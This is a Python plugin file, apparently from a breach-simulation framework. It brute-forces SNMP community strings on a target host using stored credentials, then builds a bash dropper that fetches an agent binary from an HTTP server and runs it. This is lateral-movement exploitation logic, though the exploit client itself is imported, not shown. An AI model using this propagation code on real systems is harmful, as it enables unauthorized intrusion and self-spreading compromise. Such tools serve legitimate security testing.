import logging
from functools import partial
from pprint import pformat
from typing import Any, Dict, Tuple

from agentpluginapi import (
    DropperExecutionMode,
    ExploiterResult,
    IAgentBinaryRepository,
    IAgentCommandBuilderFactory,
    IAgentEventPublisher,
    IHTTPAgentBinaryServerRegistrar,
    IPropagationCredentialsRepository,
    ITCPPortSelector,
    LinuxRunOptions,
    LocalMachineInfo,
    TargetHost,
)
from monkeytypes import AgentID, Event
from plugintoolbox import build_bash_dropper

# dependencies to get rid of or internalize
from infection_monkey.exploit.tools.helpers import get_agent_dst_path

from .community_string_generator import generate_community_strings
from .snmp_client import SNMPClient
from .snmp_exploit_client import SNMPExploitClient
from .snmp_exploiter import SNMPExploiter
from .snmp_options import SNMPOptions

logger = logging.getLogger(__name__)


SNMP_PORTS = [161]


def should_attempt_exploit(host: TargetHost, snmp_client: SNMPClient) -> Tuple[bool, str]:
    if set(SNMP_PORTS).issubset(host.ports_status.udp_ports.closed):
        return False, "Host has no open SNMP ports"
    try:
        snmp_client.get_system_name(host.ip, "public")
    except Exception:
        return False, "Host does not have SNMP enabled"
    return True, ""


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: AgentID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        http_agent_binary_server_registrar: IHTTPAgentBinaryServerRegistrar,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        tcp_port_selector: ITCPPortSelector,
        local_machine_info: LocalMachineInfo,
        agent_command_builder_factory: IAgentCommandBuilderFactory,
        **kwargs,
    ):
        self._plugin_name = plugin_name
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        self._http_agent_binary_server_registrar = http_agent_binary_server_registrar
        self._propagation_credentials_repository = propagation_credentials_repository
        self._agent_command_builder_factory = agent_command_builder_factory

    def run(
        self,
        *,
        host: TargetHost,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResult:
        try:
            logger.debug(f"Parsing options: {pformat(options)}")
            snmp_options = SNMPOptions(**options)
        except Exception as err:
            msg = f"Failed to parse SNMP options: {err}"
            logger.exception(msg)
            return ExploiterResult(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        snmp_client = SNMPClient(snmp_options.snmp_request_timeout, snmp_options.snmp_retries)

        attempt_exploit, msg = should_attempt_exploit(host, snmp_client)
        if not attempt_exploit:
            logger.debug(f"Skipping brute force of host {host.ip}: {msg}")
            return ExploiterResult(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        try:
            logger.debug(f"Running SNMP exploiter on host {host.ip}")
            community_strings = generate_community_strings(
                self._propagation_credentials_repository.get_credentials()
            )

            snmp_exploiter = self._create_snmp_exploiter(snmp_client, host)
            return snmp_exploiter.exploit_host(host, snmp_options, community_strings, interrupt)
        except Exception as err:
            msg = f"An unexpected exception occurred while attempting to exploit host: {err}"
            logger.exception(msg)
            return ExploiterResult(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

    def _create_snmp_exploiter(
        self,
        snmp_client: SNMPClient,
        target_host: TargetHost,
    ) -> SNMPExploiter:
        exploit_client = SNMPExploitClient(
            self._agent_id, self._agent_event_publisher, self._plugin_name, snmp_client
        )
        destination_path = get_agent_dst_path(target_host)
        agent_command_builder = (
            self._agent_command_builder_factory.create_linux_agent_command_builder()
        )
        run_options = LinuxRunOptions(
            agent_destination_path=destination_path,
            dropper_execution_mode=DropperExecutionMode.NONE,
        )
        agent_command_builder.build_run_command(run_options)
        dropper_transform = partial(
            build_bash_dropper, destination_path, agent_command_builder.get_command()
        )

        agent_command_builder.reset_command()
        return SNMPExploiter(
            exploit_client,
            self._http_agent_binary_server_registrar,
            dropper_transform,
            agent_command_builder,
        )
